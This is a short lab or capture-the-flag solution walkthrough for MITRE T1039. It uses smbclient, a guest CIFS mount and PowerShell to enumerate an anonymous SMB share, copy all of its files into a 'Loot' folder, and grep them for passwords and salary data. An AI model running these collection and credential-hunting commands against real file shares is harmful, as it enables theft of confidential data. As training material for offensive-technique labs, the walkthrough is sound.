# T1039 – Data from Network Shared Drive | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Linux | **MITRE:** T1039

## Step 1 – Enumerate Shares
```bash
smbclient -L //localhost -N
# Sharename   Type   Comment
# corpshare   Disk
# IPC$        IPC    IPC Service
```

## Step 2 – Browse Share
```bash
smbclient //localhost/corpshare -N
smb: \> ls
smb: \> cd Finance
smb: \Finance\> get budget_2024.txt /tmp/budget.txt
smb: \Finance\> exit
cat /tmp/budget.txt
# HACKTIFY{NETWORK_SHARE_COLLECTION_<hash>}
```

## Step 3 – Mount and Collect All Data
```bash
sudo mkdir -p /mnt/corpshare
sudo mount -t cifs //localhost/corpshare /mnt/corpshare -o guest,vers=2.0
# Collect all files:
find /mnt/corpshare -type f | while read f; do
    echo "=== $f ==="; cat "$f"; echo
done
# Grep for sensitive content:
grep -r "password\|FLAG\|salary\|HACKTIFY" /mnt/corpshare/
sudo umount /mnt/corpshare
```

## Step 4 – Windows Equivalent
```powershell
net use Z: \\server\share /user:guest ""
robocopy Z:\ C:\Loot\ /E /COPYALL
Get-ChildItem Z:\ -Recurse | Select-String "password"
```
